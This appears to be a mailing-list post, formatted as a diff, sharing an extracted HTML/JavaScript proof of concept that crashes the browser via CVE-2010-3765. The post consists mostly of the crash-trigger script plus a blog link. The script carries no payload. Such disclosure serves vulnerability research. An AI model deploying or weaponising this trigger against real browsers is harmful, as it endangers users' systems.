@@ -1,0 +1,31 @@
+Hi there,
+
+For those who still do not know .. The proof of concept (that I have
+extracted) for CVE-2010-3765 is the following:
+
+<html><body>
+<script>
+
+  function G(str){
+    var cobj=document.createElement(str);
+    document.body.appendChild(cobj);
+    cobj.scrollWidth;
+  }
+
+  function crashme() {
+    document.write("fooFOO");
+    G("a");
+    document.write("<a lang></a>a");
+    G("base");
+    document.write("barBAR");
+    G("audio");
+  }
+</script>
+<script>crashme();</script>
+</body>
+</html>
+
+For more details:
+http://extraexploit.blogspot.com/2010/10/cve-2010-3765-proof-of-concept.html
+-- 
+http://extraexploit.blogspot.com
